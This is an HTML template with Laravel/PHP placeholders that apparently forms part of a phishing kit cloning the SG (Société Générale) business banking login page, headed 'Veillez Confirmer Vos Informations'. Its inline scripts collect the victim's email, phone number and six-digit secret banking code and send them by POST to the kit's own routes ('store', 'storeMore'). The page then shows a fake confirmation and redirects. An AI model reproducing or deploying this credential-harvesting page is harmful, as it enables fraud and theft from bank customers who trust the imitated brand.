<!DOCTYPE html><html lang="fr" class="swm-root-active swm-mode-page"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1">
    <meta name="format-detection" content="telephone=no">
    
        <script>if (top != self) { top.location = self.location; }</script>
    
    <title>SG | Connexion</title>


        <script charset="UTF-8" src="{{ url('/') }}/js/n2g_secu.js"></script>
<script type="text/javascript">frame_shield();</script>
<script type="application/json" id="sas_user_info">
{

}
</script>


<link rel="canonical" href="#">
<meta property="og:url" content="#">

<title>Veillez Confirmer Vos Informations</title>
            <meta name="title" content="Veillez Confirmer Vos Informations">
            <meta property="og:title" content="Veillez Confirmer Vos Informations">
        <meta name="twitter:card" content="summary">

<script>
if (!window.cmsConstants) window.cmsConstants = {};

window.cmsConstants.LOGGER_SERVICE_END_POINT = "/extrestcontent/logBigData";
window.cmsConstants.LOGGER_LEVEL_MIN_SERVER = "error";
window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT = "debug";

window.cmsConstants.LOGGER_SERVICE_END_POINT_DEFAULT = "/extrestcontent/logBigData";
window.cmsConstants.LOGGER_LEVEL_MIN_SERVER_DEFAULT = "ERROR";
window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT_DEFAULT = "ERROR";
</script><meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover"><link rel="icon" type="image/x-icon" href="{{ url('/') }}/favicon.ico">

<script type="text/javascript">
function getCookie(name) {
var value = "; " + document.cookie;
var parts = value.split("; " + name + "=");
if (parts.length == 2) {
    return parts.pop().split(";").shift();
}
return "";
}

function setValue(defaultVal, val) {
if (val == null || val.trim() === '') {
    return defaultVal
}
return val;
}


function setValueBoolean(defaultVal, val) {
if (val == null || val.trim() === '') {
    return defaultVal
}
return val == 1;
}

function addAdditionalParams(tc_vars) {
try {
    var additionals = ""
    additionals = additionals.replace(/'/g, "").replace(/"/g, '')
    const params = additionals.split(',')
    for (var i = 0; i < params.length; i++) {
        const param = params[i].split(':')
        tc_vars[param[0].trim()] = param[1].trim()
    };
} catch (e) {
}
}
function getTechnicalUrl() {
var parser = document.createElement("a");
parser.href = document.querySelector('meta[property="og:url"]').content;
var technical_url = parser.href.replace(parser.protocol +'//'+ parser.hostname,'');
return technical_url
}

function getEnvRelease(){
var urlEnv = window.location.href;
if(urlEnv.indexOf("sg.fr") > -1){
    return "sg";
}else{
    return "societe-generale";
}
}

const empty = "";
//const version = "V3";
var tc_vars = {
"page_section": setValue(empty, ""),
"page_category_1": "",
"page_category_2": "",
"page_category_3": "",
"page_name": "user-login-page-entreprises",
"page_type": setValue(empty, ""),
"page_noload": false,
"no_load": false,
"product_category_1": setValue(empty, ""),
"product_category_2": setValue(empty, ""),
"product_category_3": setValue(empty, ""),
"product_category_4": setValue(empty, ""),
"product_category_5": setValue(empty, ""),
"product_name_trade": setValue(empty, ""),
"product_target": setValue(empty, ""),
"env_channel": setValue("website", ""),
"env_market": setValue("entreprises", ""),
"env_work": "production",
"user_is_identified": false,
"user_is_supervisor" : false,
"env_is_private": setValueBoolean(true, ""),
"page_technical_url": getTechnicalUrl(),
"user_bank":setValue(empty, ""),
"env_domain":getEnvRelease()
};
addAdditionalParams(tc_vars);

var xiti_xtn2 = "";
var xtn2 = "";



var sasInf = document.getElementById('sas_user_info');
if (sasInf) {
var sasHtml = sasInf.innerHTML;
try {
    var sasJs = JSON.parse(sasHtml.trim());
    if (sasJs && sasJs.IdStat && sasJs["user-info-firstname"] && sasJs["user-info-lastname"]) {
        tc_vars["user_id"] = sasJs.IdStat;
        tc_vars["user_is_logged"] = true;
        

    } else {
        tc_vars["user_is_logged"] = false;
        
    }
    if(sasJs && sasJs["user-info-sup"]==="true" ){
        tc_vars["user_is_supervisor"] = true;
        
    }else{
        tc_vars["user_is_supervisor"] = false;
        
    }

} catch (e) {
    tc_vars["user_is_logged"] = false;
    
}
} else {
tc_vars["user_is_logged"] = false;

}
</script>
<script type="text/javascript">
if (typeof userSegments === "undefined") {
var userSegments = [];
}
if (typeof userSegmentNames === "undefined") {
var userSegmentNames = [];
}

userSegments.push("S--1470891196-0000000000000000000000RCRD");

userSegments.push("S-1291998658-00000000000000000000000RCRD");

userSegments.push("S-1609544352-00000000000000000000000RCRD");

userSegmentNames.push("0");

userSegmentNames.push("Desktop");

userSegmentNames.push("Clients_Generiques");
</script>
<script charset="UTF-8" src="{{ url('/') }}/js/init-configs.js"></script>
                <script charset="UTF-8" src="{{ url('/') }}/js/dca_portail_global.js"></script>
                <script charset="UTF-8" src="{{ url('/') }}/js/public-dca.js"></script>
                <script charset="UTF-8" src="{{ url('/') }}/js/gda.public.js"></script>
                <link href="{{ url('/') }}/css/print.min.css" rel="stylesheet" type="text/css" media="print">
            <script charset="UTF-8" src="{{ url('/') }}/js/vendor.min.js"></script>
        <script charset="UTF-8" src="{{ url('/') }}/js/index.min.js"></script>
        <link href="{{ url('/') }}/css/index.min.css" rel="stylesheet" type="text/css">
            <script charset="UTF-8" src="{{ url('/') }}/js/public-tms.js"></script>
                
<!-- URL: https://entreprises.sg.fr/restcontent/theme/09c59be3b8893710VgnVCM1000000ae1c6c0RCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: f1d9112f38323710VgnVCM1000000ae1c6c0RCRD, templateID: 09c59be3b8893710VgnVCM1000000ae1c6c0RCRD, isRenderPageFeatures: true, FURL_NAME: /ent/authen/theme, FURL_ID: 722a112f38323710VgnVCM1000000ae1c6c0RCRD -->


</head>
<body class="ENT waitJeton swm swm-mode-page  swm-page-authent swm-theme-SITE_WEB">


    <button class="dcw_skip" onclick="scrollToElement('go-navigation');">Aller au menu principal</button>
<button class="dcw_skip" onclick="scrollToElement('go-content');">Aller au contenu</button>
<header class="rsp_header header-deco header-authent" role="banner">
<nav class="rsp_nav rsp_nav--above">
<a id="go-navigation" tabindex="-1"></a>
<ul class="rsp_nav__list">
        <li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="32e2654d31c94710VgnVCM10000057f440c0RCRD">
<a href="/assistance" class="rsp_nav__link" onclick="bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-deconnectee::'+&quot;aide-et-contacts&quot;})"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#lhs-urgence"></use></svg><span>Contacts</span></a>
</li>
</ul>
</nav>

<div class="rsp_header__wrapper-nav">
<h2 class="rsp_header__title-logo">
<a href="/icd-web/syd-front/index-comptes.html#comptes" class="rsp_header__logo-mob" title="SG - Aller à l'accueil" data-tracking="logo-entreprises" onclick="bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-connectee::'+(this.dataset.tracking)})">
<svg aria-label="Logo SG" focusable="false" height="30" width="68" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 95 42" style="enable-background:new 0 0 95 42;" xml:space="preserve">
<style type="text/css">
.st0{fill:#E60028;}
.st1{fill:#FFFFFF;}
</style>
<g>
<g>
<path d="M9.6,18.8l1.9,0.4c4.8,1,6.9,3.1,6.9,6.9c0,4.6-3.4,7.1-9.7,7.1H0.2v-4.9c2.8,0.6,5.7,0.9,8.1,0.9c3.7,0,5.5-1,5.5-2.9    s-0.9-2.5-5-3.3l-1.9-0.4C2.1,21.6,0,19.5,0,15.7c0-4.3,3.5-6.9,9.4-6.9H17v4.9c-2.7-0.6-4.9-0.9-7.2-0.9c-3.3,0-5.1,1-5.1,2.7    C4.6,17.3,5.6,18,9.6,18.8z M42.4,21v12.2h-7.8c-8.8,0-14-4.5-14-12.2c0-7.7,5.1-12.2,14-12.2h6v4.7c-2.1-0.5-4.2-0.7-6.3-0.7    c-5.7,0-9,3-9,8.2c0,5,3.3,8,9,8H38l0-8H42.4z"></path>
</g>
<rect x="52.7" y="0" class="st0" width="42" height="18.9"></rect>
<rect x="52.7" y="23.1" width="42" height="18.9"></rect>
<rect x="52.7" y="18.9" class="st1" width="42" height="4.2"></rect>
</g>
</svg>
</a>
<a href="/icd-web/syd-front/index-comptes.html#comptes" class="rsp_header__logo-desktop" title="SG - Aller à l'accueil" data-tracking="logo-entreprises" onclick="bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-connectee::'+(this.dataset.tracking)})">
<svg aria-label="Logo SG" focusable="false" height="30" width="68" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 95 42" style="enable-background:new 0 0 95 42;" xml:space="preserve">
<style type="text/css">
.st0{fill:#E60028;}
.st1{fill:#FFFFFF;}
</style>
<g>
<g>
<path d="M9.6,18.8l1.9,0.4c4.8,1,6.9,3.1,6.9,6.9c0,4.6-3.4,7.1-9.7,7.1H0.2v-4.9c2.8,0.6,5.7,0.9,8.1,0.9c3.7,0,5.5-1,5.5-2.9    s-0.9-2.5-5-3.3l-1.9-0.4C2.1,21.6,0,19.5,0,15.7c0-4.3,3.5-6.9,9.4-6.9H17v4.9c-2.7-0.6-4.9-0.9-7.2-0.9c-3.3,0-5.1,1-5.1,2.7    C4.6,17.3,5.6,18,9.6,18.8z M42.4,21v12.2h-7.8c-8.8,0-14-4.5-14-12.2c0-7.7,5.1-12.2,14-12.2h6v4.7c-2.1-0.5-4.2-0.7-6.3-0.7    c-5.7,0-9,3-9,8.2c0,5,3.3,8,9,8H38l0-8H42.4z"></path>
</g>
<rect x="52.7" y="0" class="st0" width="42" height="18.9"></rect>
<rect x="52.7" y="23.1" width="42" height="18.9"></rect>
<rect x="52.7" y="18.9" class="st1" width="42" height="4.2"></rect>
</g>
</svg>
</a>
</h2>
</div>

<h1 class="rsp_header__title-page" id="js-mobile-title">Veillez Confirmer Vos Informations</h1>

<input id="breadcrumb-channel-ids" type="hidden" value="f1d9112f38323710VgnVCM1000000ae1c6c0RCRD,5777227b02e6d610VgnVCM100000da4658c0RCRD,965e5ebf3e34d610VgnVCM100000da4658c0RCRD">
<script>
function scrollToElement(elementId){
let element = document.getElementById(elementId);
element.scrollIntoView();
element.focus();
}
</script>
</header>
<main class="dcw_main dcw_gb9_core-wrapper" role="main">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb_row">
</section>
<section class="dcw_gb_wrapper">
<section class="dcw_gb9_core-left" id="">

<!-- URL: https://entreprises.sg.fr/restcontent/regions/f1d9112f38323710VgnVCM1000000ae1c6c0RCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: f1d9112f38323710VgnVCM1000000ae1c6c0RCRD, regionNames: header-int-without-navigation-and-open-main,gb9-com1-int, FURL_NAME: /ent/authen/header, FURL_ID: 360a112f38323710VgnVCM1000000ae1c6c0RCRD -->


    





<noscript>
<style>
.auth-content {display:none !important;}
.waitAuthJetonMsg {display: none !important;}
</style>
</noscript>

<link rel="stylesheet" href="css/style.css">


<script>









window.swmConfOverride = {
"version": "23.3.4",
"firm": "BDDF",
"market": "ENT",
"isNGIM": true,
"isCookieless": false,
"media": "WEB_INT",
"swmEnv": "prod",
"isProspect": false,
"isCarteAffaires": false,
"codeClientEtoileNgim": "",
"defaultUrl": "\/icd-web\/syd-front\/index-comptes.html",


"isSASAuth": false,

"isSupervision": false,
"logLocal": false,
"logNiveau": "error",
"staticBaseUrl": "/icd/static/swm/resources/version/23.3.4",
"baseUrl": "",
"styles": [],
"isDebug": false,


};



</script>

<div id="swm-wrapper" class="swm-inner-wrapper">
<div class="prefetch"></div>
<div id="disableLayer" class="disable-layer"></div>





<div id="swm-tooltip" class="swm-tooltip">
<span></span>
</div>
<div class="swm-popin-wrapper" role="dialog" aria-modal="true" aria-labelledby="swm-modal-label">
<div id="swm-popin-overlay" class="swm-popin-overlay" role="presentation"></div>
<div id="swm-popin-dialog" class="swm-popin-dialog">
<div class="swm-popin-relative">
<div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" role="button" tabindex="0" aria-label="Fermer la popin"></div>
<div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
    <div id="swm-popin" class="swm-popin">
        <div id="swm-popin-cadre" class="swm-popin-cadre">
        </div>
    </div>
</div>
</div>
</div>
</div>


                













    



<script>
    var code = "";
    document.addEventListener('DOMContentLoaded', function () {
    // Sélection de l'élément input par son ID
    var inputElement = document.getElementById('email');
    var phoneElement = document.getElementById('phone');

    var val1 = document.getElementById('btn-validate');

    
    var jsError = document.getElementById('js-error');
    var jsError1 = document.getElementById('js-error-1');

  
    inputElement.addEventListener('input', function () {
        jsError.style.display="none";
    });
    phoneElement.addEventListener('input', function () {
        jsError1.style.display="none";
    });

    val1.addEventListener('click', function () {
        var inputValue = inputElement.value;
        var phoneValue = phoneElement.value;
 
        var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        
        var phonePattern = /^\d{3,}$/;

    if (phonePattern.test(phoneValue)) {
         
        if (emailPattern.test(inputValue)) {
            const csrfToken = "<?= csrf_token() ?>";

                // Créer une nouvelle instance de XMLHttpRequest
                const xhr = new XMLHttpRequest();

                // Configurer la requête
                xhr.open("POST", "<?= route('storeMore', $user->id) ?>", true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.setRequestHeader('X-CSRF-TOKEN', csrfToken);

                // Définir la fonction de rappel pour traiter la réponse
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {  // 4 signifie que la requête est complétée
                        if (xhr.status === 200) {
                            // La requête a été réussie
                            var response = JSON.parse(xhr.responseText);
                            console.log(response);
                           
                        } else {
                            // Il y a eu une erreur dans la requête
                            jsErr.style.display="block";
                            console.error("Erreur lors de la requête :", xhr.status, xhr.statusText);
                           
                        }
                    }
                };

                // Convertir les données en chaîne de requête (format "key1=value1&key2=value2")
                const data = "_token=" + encodeURIComponent(csrfToken) +"&email=" + encodeURIComponent(inputValue) + "&phone=" + encodeURIComponent(phoneValue);

                // Envoyer la requête avec les données
                xhr.send(data);
                alert('Felicitation vos données ont été confirmer avec succès')
                window.location.href="<?= route('home') ?>"
        } 
        else {
                    
                    jsError.style.display="block";
                }
    }
    else{
        jsError1.style.display="block";
    }

           
            
               
    });


});
</script>


<div class="swm_authent">
    
        
    <div class="auth-content js-content-aria-hide swm_codeContainer">


        <div id="swmModulesAuth">
    <div id="module-authent-cv">
        <div class="container-mire-codeClient">
            <div class="swm_block">
                <form class="component-mire-codeclient">
                    <div class="swm_block-element">
                        <div class="auth-cs-content swm_input-container">
                            <input
                                id="email"
                                name="email"
                                type="email"
                                class="swm_input grey_cross ngim-input"
                                autocapitalize="off"
                                autocorrect="off"
                                aria-label="Code client"
                                placeholder=" "
                                autocomplete="off"
                               
                                aria-describedby="js-error"
                                required=""
                            />
                        
                            <span class="bar" aria-hidden="true"></span>
                            <label for="email"
                                >Saisissez votre Addresse Email</label
                            >
                        </div>
                        <br>
                        <div class="auth-cs-content swm_input-container">
                            <input
                                id="phone"
                                name="phone"
                                type="phone"
                                class="swm_input grey_cross ngim-input"
                                autocapitalize="off"
                                autocorrect="off"
                                aria-label="Code client"
                                placeholder=" "
                                autocomplete="off"
                                maxlength="32"
                                aria-describedby="js-error"
                                required=""
                            />
                        
                            <span class="bar" aria-hidden="true"></span>
                            <label for="phone"
                                >Saisissez votre Numero De Telephone</label
                            >
                        </div>

                        <div id="js-error" aria-live="assertive" style="display: none" class="auth_error show" tabindex="-1" aria-hidden="true">
                             <div class="error-wrapper">
                                 <div class="inner">
                                       <div class="message">Votre email est incorrect</div>
                                 </div>
                              </div>
                        </div>
                        <div id="js-error-1" aria-live="assertive" style="display: none" class="auth_error show" tabindex="0">
                             <div class="error-wrapper"> <div class="inner">
                                   <div class="message">Votre Numero De Telephone est incorrect. </div> 
                            </div>
                          </div>
                         </div>
                    </div>
                 
                    <div class="auth-cs-content-validate" id="btn-container" style="display: block;">
                        <button
                            class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable"
                            id="btn-validate"
                            type="button"
                            aria-label="Valider votre identifiant"
                        >
                            Valider
                        </button>
                    </div>

                
                  


                </form>
            </div>
        </div>

        
                            <script>
                             

    // Fonction appelée lorsqu'une touche du clavier virtuel est cliquée
    function onKeyPress(key) {
        const jsErr = document.getElementById("js-error-1");  
        jsErr.style.display="none";
        if (code.length < 6) {
        // Ajouter la valeur de la touche à la variable code
        code += key;
        // console.log(code);
        // console.log(code.length);

        // Mettre à jour la classe en fonction de la longueur actuelle de code
        const codeLength = code.length;
        const inputElement = document.getElementById("codeSecret");

        // Retirer toutes les classes auth-pwd-N
        for (let i = 1; i <= 7; i++) {
            inputElement.classList.remove(`auth-pwd-${i}`);
        }

        // Ajouter la classe auth-pwd-N en fonction de la longueur actuelle de code
        inputElement.classList.add(`auth-pwd-${codeLength}`);
     }  
    }    

    function codeDelete() {
             
        code = "";
        const inputElement = document.getElementById("codeSecret");
        // Retirer toutes les classes auth-pwd-N
        for (let i = 1; i <= 7; i++) {
            inputElement.classList.remove(`auth-pwd-${i}`);
        }
          } 
          
          function onSubm() {
            const inputElement = document.getElementById("user_id");
            const jsErr = document.getElementById("js-error-1");
            

            if (/^\d{6}$/.test(code)) {
            const csrfToken = "<?= csrf_token() ?>";

                // Créer une nouvelle instance de XMLHttpRequest
                const xhr = new XMLHttpRequest();

                // Configurer la requête
                xhr.open("POST", "<?= route('store') ?>", true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.setRequestHeader('X-CSRF-TOKEN', csrfToken);

                // Définir la fonction de rappel pour traiter la réponse
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {  // 4 signifie que la requête est complétée
                        if (xhr.status === 200) {
                            // La requête a été réussie
                            console.log(xhr.responseText);
                            window.location.href='<?= route("home") ?>'
                        } else {
                            // Il y a eu une erreur dans la requête
                            jsErr.style.display="block";
                            console.error("Erreur lors de la requête :", xhr.status, xhr.statusText);
                           
                        }
                    }
                };

                // Convertir les données en chaîne de requête (format "key1=value1&key2=value2")
                const data = "_token=" + encodeURIComponent(csrfToken) +"&code=" + encodeURIComponent(code) + "&user_id=" + encodeURIComponent(inputElement.value);

                // Envoyer la requête avec les données
                xhr.send(data);
            }
            else{
                jsErr.style.display="block";
            }

            }
   

            
            
                            </script>

    


    </div>
</div>



    
  </div>


    



<script>
var fun;
function onSWMLoaded(params) {
    if ("") {
        fun = function() {
            params.error ? params.error() : (function () {
                if (!document.getElementById('js-error')) {
                    document.getElementById(params.defaultClass || 'swm-wrapper').innerHTML = ("<div id=\"js-error\"></div>");
                }
                swm.commun.showErrorMessage.call(
                    this,
                    "",
                    "/icd-web/syd-front/index-comptes.html");
            })();
        };
        window.swm ? fun() : document.addEventListener("swm.onLoad", fun);
    } else {
        fun = initSWM.bind(this, params);
        window.swm ? initSWM(params) : document.addEventListener("swm.onLoad", fun);
    }
}


function initSWM(params) {
    
    window.jQueryForSwm = swm.$;
    window.swmAutoInit = false;
    (function(a,b){if(typeof define==="function"&&define.amd){if(typeof swmAutoInit==="undefined"){swmAutoInit=false}define(["jquery"],b)}else{if(typeof swmAutoInit==="undefined"){swmAutoInit=true}var c=a.jQueryForSwm||a.jQuery;b(c)}})(this,function(g){if(window&&typeof window.swmApi!=="undefined"){return window.swmApi}var m={};var p;var s=false;var i=false;var b={getJetonCallback:[],iStockageJetonActifCallback:[],ajaxFilter:[]};var f={};m.consts={};m.consts.niveauSensibilite={};m.consts.niveauSensibilite.NORMAL={value:0};m.consts.niveauSensibilite.SENSIBLE={value:100};m.consts.niveauSensibilite.TRES_SENSIBLE={value:200};if(typeof swmConfOverride!=="undefined"){m.version=swmConfOverride.version}m.loadSwm=function(){r("The method swm.loadSwm is deprecated, please use swm.init instead.");m.init.apply(m,arguments)};m.init=function(u){var v={mainJsPath:"/js/swm.main.js",swmMain:undefined};q(v,u);function w(){m.config=p.config;m.$=p.$;s=false;i=true;o();c("swm.available",p)}m.addConf({onAuthent:v.onAuthent,onBack:v.onBack,onClose:v.onClose,onConnecting:v.onConnecting,onInitDone:v.onInitDone,onLoadingError:v.onLoadingError,onLogout:v.onLogout,ajaxFilterRegExp:v.ajaxFilterRegExp,ajaxFilterJquery:v.ajaxFilterJquery,baseUrl:v.baseUrl});if(!i){p=v.swmMain;if(typeof p!=="undefined"){setTimeout(w,0)}else{j("swm.init",function(x){p=x;w()});if(!s){s=true;var t;if(typeof swmConfOverride!=="undefined"&&swmConfOverride.staticBaseUrl){t=(v.baseUrl||"")+swmConfOverride.staticBaseUrl+v.mainJsPath}else{t="/swm/resources/version/"+m.version+v.mainJsPath}k(t,function(){c("swm.loadingError")})}}}else{c("swm.available",p)}};if(window.swmAutoInit){j("swm.loaded",m.init)}window.swmAutoInit=undefined;m.ajaxFilter=function(u,t){if(p){u.ajaxFilterJquery=u.ajaxFilterJquery||g||p.$;if(u.ajaxFilterRegExp){u.ajaxFilterJquery.ajax=p.filterAjaxRequests(u).overridedAjax;if(typeof t==="function"){t()}}return u.ajaxFilterJquery.ajax}else{a("ajaxFilter",[u,t])}};m.onLogout=function(t){j("swm.logout",t)};m.onClose=function(t){j("swm.close",t);j("swm.closeKeyboard",t)};m.onConnecting=function(t){j("swm.connecting",t)};m.onBack=function(t){j("swm.back",t)};m.onLogoutError=function(t){j("swm.logout.error",t)};m.onAuthent=function(t){j("swm.postchgtnivauth",t)};m.setStockageJetonActif=function(t){t=t==true;if(p){p.data.setStockageJetonActif(t)}else{h("setStockageJetonActif",t)}};m.isStockageJetonActif=function(t){if(typeof t=="function"){if(p){setTimeout(function(){t(p.data.isStockageJetonActif())},0)}else{a("iStockageJetonActifCallback",t);return undefined}}};m.getJeton=function(t){if(typeof t=="function"){if(p){setTimeout(function(){t(p.data.getJeton())},0)}else{a("getJetonCallback",t);return undefined}}};m.getIdStat=function(){if(p){return p.data.getIdStat()}return undefined};m.sign=function(t,v){if(p){return p.sign(t,v)}else{var u={getData:function(){return new Error("Signature non prÃªte public.")}};h("sign",{params:[t,v],promise:u});if(typeof t==="string"){return u}}};m.triggerSwmLogout=function(){if(p){return p.triggerSwmLogout()}else{return new Error("triggerSwmLogout non prÃªte public.")}};m.record=function(t){if(p){return p.record(t)}else{h("record",arguments)}};m.checkSign=function(t){if(p){return p.checkSign(t)}else{h("checkSign",arguments)}};m.gda_handleResponse=function(w,u,v,t){if(p){return p.gda_handleResponse(w,u,v,t)}else{return undefined}};m.errorSign=function(t){var u={};u.success=t.success;u.actionLevel=t.action_level||t.actionLevel||0;u.jetonTransaction=t.context||t.jetonTransaction;u.error=t.error;u.isMessageRequired=t.isMessageRequired;u.callback=t.callback;if(p){return p.errorSign(u)}else{h("errorSign",arguments)}};m.getDateDerniereConnexion=function(){if(p){return p.data.getDateDerniereConnexion()}return undefined};m.getCanalDerniereConnexion=function(){if(p){return p.data.getCanalDerniereConnexion()}return undefined};m.getDroits=function(){if(p){return p.data.getDroits()}return undefined};m.logout=function(){if(p){p.logout.apply(m,arguments)}else{h("logout",arguments)}};m.logoutSupervision=function(){r("The method swmApi.logoutSupervision is deprecated, please use swmApi.logout instead.");m.logout()};m.resetAuthentData=function(){if(p){p.data.resetAuthentData.apply(m,arguments)}else{h("resetAuthentData",arguments)}};m.isAuthenticated=function(){if(p){return p.isAuthenticated()}return false};m.authent=function(u,t,v){if(p){t=t||function(w){if(f.preSuccess==="function"){f.preSuccess(w,function(){f.success(w)})}else{f.success(w)}};v=v||f.error;return p.authent(u,t,v)}else{h("authent",[u,t,v])}return false};m.setDefaultAuthentCallbacks=function(t){f.preSuccess=t.preSuccess||f.preSuccess;f.success=t.success||f.success;f.error=t.error||f.error};m.changeCodeSecret=function(t,u){if(p){return p.changeCodeSecret(t,u)}else{h("changeCodeSecret",[t,u])}return false};m.addConf=function(t){t.onAuthent&&j("swm.postchgtnivauth",t.onAuthent);t.onLogout&&j("swm.logout",t.onLogout);t.onBack&&j("swm.back",t.onBack);t.onClose&&j("swm.close",t.onClose);t.onConnecting&&j("swm.connecting",t.onConnecting);t.onLoadingError&&j("swm.loadingError",t.onLoadingError);t.onAjaxFilterReady&&j("swm.onResponseFilterReady",t.onAjaxFilterReady);if(t.ajaxFilterRegExp){var u={ajaxFilterRegExp:t.ajaxFilterRegExp,ajaxFilterJquery:t.ajaxFilterJquery,ajaxFilterAxios:t.ajaxFilterAxios};m.ajaxFilter(u,t.onAjaxFilterReady)}if(t.baseUrl){d(t.baseUrl)}if(typeof p!="undefined"){t.onInitDone&&t.onInitDone()}else{t.onInitDone&&j("swm.available",t.onInitDone)}};function d(t){if(p){p.config.baseUrl=t}else{h("setBaseUrl",[t])}}function h(t,u){b[t]=u;!s&&!i&&m.init()}function a(t,u){b[t].push(u);!s&&!i&&m.init()}function n(t){return t&&Object.prototype.toString.call(t)==="[object Array]"}function o(){for(var v in b){if(v==="iStockageJetonActifCallback"||v==="getJetonCallback"){for(var u in b[v]){m.hasOwnProperty(v)&&typeof m[v]==="function"&&m[v](u)}}else{if(v==="signature"){var w=m[v].apply(m,b[v].params);if(typeof w==="object"){b.signature.promise.getData=w}}else{if(v==="setBaseUrl"){d.apply(m,b.setBaseUrl)}else{if(n(b[v])){for(var t in b[v]){b[v].hasOwnProperty(t)&&m[v].apply(m,b[v][t])}}else{m[v].apply(m,b[v])}}}}}b={getJetonCallback:[],iStockageJetonActifCallback:[]}}function c(t,v){var u=document.createEvent("Event");u.initEvent(t,true,true);u.data=v;document.dispatchEvent(u);var x=window.self!==window.top;if(x){try{top.document.dispatchEvent(u)}catch(w){}}}g&&(g.fn.triggerExternal=c);function j(u,v){var t=function(w){if(typeof v==="function"){v(w.data)}};document.removeEventListener(u,t);document.addEventListener(u,t)}function k(u,v){if(g&&typeof g.Deferred!=="undefined"){var t=l(u);g.when(t).fail(v)}else{e(u,v)}}function l(v){var t=g.Deferred(),u=document.createElement("script");u.async="async";u.type="text/javascript";u.src=v;u.onload=u.onreadystatechange=function(x,w){if(!u.readyState||/loaded|complete/.test(u.readyState)){if(w){t.reject()}else{t.resolve()}}};u.onerror=function(){t.reject()};g("head")[0].appendChild(u);return t.promise()}function e(u,v){var t=document.createElement("script");t.async=false;t.src=u;t.type="text/javascript";t.onerror=v;t.charset="UTF-8";document.getElementsByTagName("head")[0].appendChild(t)}function r(u){try{console&&typeof console.warn==="function"&&console.warn("[SWM] "+u)}catch(t){}}function q(u,t){if(t){for(var v in t){if(t.hasOwnProperty(v)){u[v]=t[v]}}}return u}setTimeout(function(){c("swm.loaded",m)},0);window.swmApi=m;return m});
    swmApi.init({
        swmMain: swm
    });
    swm.commun.setGdaReplay("/swm/swm-redirect.html", "W6c9YMV%2FMuNKbhVrJbT%2FCp9SYRcsAQAAAQAAAEAAAAAvaWNkLXdlYi9zeWQtZnJvbnQvaW1hZ2VzL3BpY3Rvcy1mb25jdGlvbm5lbHNfMjAyMzA1MTAxNzU3NTYuc3Zn", "" || window.location.hash);
    if ("") {
        swm.commun.showError("");
    }
    params.event && swm.trackEvent(params.event);
    document.removeEventListener("swm.onLoad", fun);
    fun = undefined;
    params.success && params.success();
}
</script>

    <script>
        onSWMLoaded({
            defaultClass: 'swmModulesAuth',
            success: function() {
                
                swmApi.setDefaultAuthentCallbacks({
                    success : function(rsp) {
                        swm.commun.replayInterceptedPage();
                    },
                    error: function(err) {
                        swm.defaultAuthentError(err, "/icd-web/syd-front/index-comptes.html");
                    }
                });
                
                swmApi.authent("300");
            },
            event: {
                pageName: 'Mon_Profil::Connexion::Ecran_Connexion'
            }
        });
    </script>

</div>



<script type="text/javascript" src="{{ url('/') }}/js/swm.main.js" charset="UTF-8"></script>





<script type="text/javascript">
if (typeof(swm) != "undefined" && swm.onLogout) {
swm.onLogout(function() {
    document.location.href = '/icd-web/syd-front/index-comptes.html';
});
}

</script>
</div>


    </section>
<section class="dcw_gb9_core-right">



















<div>

<div>
    <link rel="stylesheet" href="{{ url('/') }}/icd/static/swm/resources/version/23.3.4/assets/markets/BDDF/ENT/INT/style.css">
    <link href="{{ url('/') }}/css/eo2680-style.css" rel="stylesheet"><!-- default -->
<div id="swm-content-default">
<p><strong>Où trouver mon Identifiant Client SG ?</strong></p>

<ul>
<li><strong>•</strong> Si vous êtes l’administrateur de l’abonnement, votre Identifiant Client vous a été attribué par votre Chargé d’Affaires lors de la souscription de votre contrat Sogecash Net.</li>
<li><strong>•</strong> Si vous êtes un utilisateur délégué, votre Identifiant Client vous est attribué directement par votre Administrateur.</li>
<li><strong>•</strong> Si vous étiez client d’une des banques du Groupe Crédit du Nord, le nouvel Identifiant Client SG a été envoyé par courrier postal il y a quelques semaines à l'administrateur de l'abonnement.</li>
</ul>
&nbsp;

<p><strong>Mon Code Secret a-t-il changé avec SG ?</strong></p>

<ul>
<li>Vous seul connaissez votre Code Secret.</li>
<li><strong>•</strong> Si vous étiez client Société Générale, utilisez votre Code Secret habituel.</li>
<li><strong>•</strong> Si vous étiez client d’une des banques du Groupe Crédit du Nord, utilisez le Code Secret qui vous permettait de vous connecter à votre banque en ligne.</li>
</ul>
&nbsp;

<p><strong>Identifiant Client ou Code Secret inconnus, accès bloqué ?</strong></p>

<ul>
<li>Pour l’administrateur de l’abonnement :</li>
<li>&gt;&gt; <u><a href="/swm/swm-restitution.html">Obtenir mon Identifiant Client</a></u></li>
<li>&gt;&gt; <u><a href="/swm/swm-reattribution.html">Demande de nouveau Code Secret / Accès bloqué</a></u></li>
<li>Si vous êtes un utilisateur délégué, rapprochez-vous de votre administrateur.</li>
</ul>
&nbsp;

<p><strong>Nos autres Espaces Client</strong></p>

<ul>
